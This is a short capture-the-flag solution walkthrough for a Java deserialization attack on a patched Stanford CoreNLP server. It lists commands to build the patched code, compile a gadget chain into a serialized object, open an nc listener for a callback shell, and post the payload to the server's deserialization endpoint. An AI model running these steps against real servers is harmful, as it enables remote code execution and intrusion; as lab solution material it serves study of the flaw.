# Solution Walkthrough

### Grab CoreNLP v4.5.8 and Apply Patches
```
wget https://github.com/stanfordnlp/CoreNLP/archive/refs/tags/v4.5.8.zip && \
unzip v4.5.8.zip && \
cd CoreNLP-4.5.8 && \
patch -p1 < ../chal.patch && \
ant
```

### Compile CoreNLP
```
jar -cf ../stanford-corenlp.jar edu
```

### Write Gadget Chain and Make Serilaized Object

see sol.java for Gadget Chain, change IP and port as needed
```
javac -cp "CoreNLP-4.5.8/classes:CoreNLP-4.5.8/lib/*" sol.java
java -cp ".:CoreNLP-4.5.8/classes:CoreNLP-4.5.8/lib/*" sol
```

### Open Listener and Send Request
Window 1:
```
nc -lvnp 8000
```

Window 2:
```
wget --post-file exploit.ser 'localhost:9000/?properties={"inputFormat": "serialized", "inputSerializer":"edu.stanford.nlp.pipeline.GenericAnnotationSerializer"}' -O /tmp/t 
```

